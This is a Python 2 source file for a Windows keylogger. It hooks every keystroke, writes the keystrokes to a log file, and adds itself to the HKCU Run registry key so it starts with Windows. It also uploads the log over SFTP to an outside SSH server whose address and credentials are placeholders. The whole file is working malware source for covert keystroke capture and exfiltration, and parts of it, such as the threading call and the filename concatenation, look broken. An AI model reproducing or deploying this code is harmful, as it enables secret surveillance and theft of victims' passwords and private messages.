from pyHook import HookManager
import pythoncom
from sys import exit as sysExit
from sys import argv
import paramiko
import os
import threading
import datetime

from win32event import CreateMutex
from win32api import GetLastError
from winerror import ERROR_ALREADY_EXISTS

from _winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ  # For registry

from Tkinter import Frame, Tk, Button  # For GUI

data = ''  # To hold logged key
exitStack = []
hostAddress = <SSH IP>
filename='log.txt'
sshServerUsername = <SSH username>
sshServerPassword = <SSH Password>

# Disallow multiple instances. source: ajinabraham/Xenotix-Python-Keylogger
mutex = CreateMutex(None, 1, 'mutex_var_xboz')
if GetLastError() == ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    sysExit(0)


def addToStartup():
    dirPath = os.getcwd()
    progName = argv[0].split("\\")[-1]
    dirPath = dirPath + '\\' + progName
    keyValue = r'Software\Microsoft\Windows\CurrentVersion\Run'

    currentKey = OpenKey(HKEY_CURRENT_USER, keyValue, 0, KEY_ALL_ACCESS)
    SetValueEx(currentKey, "keylogger", 0, REG_SZ, dirPath)


class Application(Frame):  # Class for implementation of exitGui
    def CreateWidgets(self):
        self.QUIT = Button(self)
        self.QUIT["text"] = "QUIT"
        self.QUIT["fg"] = "red"
        self.QUIT["command"] = self.quit

        self.QUIT.pack({"side": "left"})

    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.CreateWidgets()


def OnKeyBoardEvent(event):
    global data
    global exitStack
    global keyLength
    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    # logging.log(10,chr(event.Ascii))

    if event.Ascii == 8:
        key = '<BACKSPACE>'
    elif event.Ascii == 13:  # Carraige return representation
        key = '<ENTER>'
    elif event.Ascii == 9:  # TAB Representation
        key = '<TAB>'
    else:
        key = chr(event.Ascii)

    data += key

    if event.Ascii == 8:
        exitStack.append(event.Ascii)
    elif event.Ascii == 0:
        exitStack.append(event.Ascii)
    else:
        exitStack = []

    if len(exitStack) == 4:
        if exitStack[0] == 8 and exitStack[1] == 0 and exitStack[2] == 8 and exitStack[3] == 0:  # If last four values
            app.mainloop()                                                                       # entered were <back><del><back><del>
            root.destroy()                                                                       # spawn a quit dialog box
            #myEmail.killConnection()
            sysExit(1)
        else:
            exitStack = []

    if (datetime.datetime.now().time().hour == 19 and datetime.datetime.now().time().minute == 0 and datetime.datetime.now().time().second == 0) | os.path.getsize('log.txt')==5000:  # Write data in chunks of 128 bytes
        writeLogs()
        t = threading.Thread(target=sendFile(), args=())
        t.start()
        #myEmail.sendEmail()
        data=''
    return True

def sendFile():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostAddress, username=sshServerUsername, password=sshServerPassword)
    sftp = client.open_sftp()
    sftp.put('log.txt', '/root/Desktop/upload/log-'+datetime.datetime.today()+'txt')

def writeLogs(name='log.txt'):
    global data
    try:
        f = open(name, 'a')
        f.write(data)
        f.close()
    except Exception, e:
        print(str(e))
    return

#myEmail = MyEmail()
#myEmail.prepareMessage()
#myEmail.initiateConnection()
addToStartup()

root = Tk()                              # Tk Object
app = Application(root)                  # Passing Tk object to our GUI implementation class
hooks_manager = HookManager()            # Create a hook
hooks_manager.KeyDown = OnKeyBoardEvent  # Assign keydown event handler
hooks_manager.HookKeyboard()             # assign hook to the keyboard
pythoncom.PumpMessages()